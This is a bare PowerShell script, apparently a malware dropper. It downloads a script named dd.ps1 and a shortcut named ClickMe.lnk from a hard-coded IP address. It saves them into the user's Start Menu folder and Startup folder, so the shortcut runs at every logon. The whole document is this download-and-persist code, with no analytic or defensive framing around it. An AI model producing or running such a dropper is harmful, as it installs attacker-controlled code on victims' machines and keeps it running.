$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/dd.ps1'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\dd.ps1"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/ClickMe.lnk'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ClickMe.lnk"
$down.DownloadFile($url, $file);